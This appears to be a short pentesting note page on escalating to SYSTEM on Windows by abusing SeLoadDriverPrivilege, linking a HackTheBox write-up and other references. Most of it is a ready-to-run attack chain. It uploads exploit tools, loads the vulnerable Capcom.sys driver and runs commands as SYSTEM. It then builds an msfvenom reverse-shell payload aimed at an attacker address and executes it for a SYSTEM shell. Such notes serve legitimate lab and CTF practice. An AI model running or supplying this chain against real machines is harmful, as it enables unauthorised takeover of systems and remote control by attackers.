# SeLoadDriver Privilege

{% embed url="https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#strategy" %}

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#capcom.sys-driver-exploit" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-accounts-and-token-privileges" %}

{% embed url="https://github.com/k4sth4/SeLoadDriverPrivilege" %}

The last github has all the instructions.&#x20;

Upload the driver [eoploaddriver\_x64.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/eoploaddriver\_x64.exe), [Capcom.sys file](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/Capcom.sys), [ExploitCapcom.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/ExploitCapcom.exe) on target machine under writable directory.

First we need to turn on the privilege of SeLoadDriverPrivilege that is disabled.

```
.\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\Temp\\Capcom.sys
```

Now using ExploitCapcom.exe load Capcom.sys to target machine.

```
.\ExploitCapcom.exe LOAD C:\Temp\Capcom.sys
```

After successfully loading Capcom.sys we can now run any cmd as privilege user with EXPLOIT keyword.

```
.\ExploitCapcom.exe EXPLOIT whoami
```

Now we can generate a revshell with msfvenom. You can also use other revshell. On Attacker vm.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe > shell.exe
```

Upload it on Traget machine. Now execute the payload.

```
.\ExploitCapcom.exe EXPLOIT shell.exe
```

You gonna get reverse shell as SYSTEM.

![](../../../../.gitbook/assets/2022-08-17\_12-40.png)

![](../../../../.gitbook/assets/2022-08-17\_12-41.png)
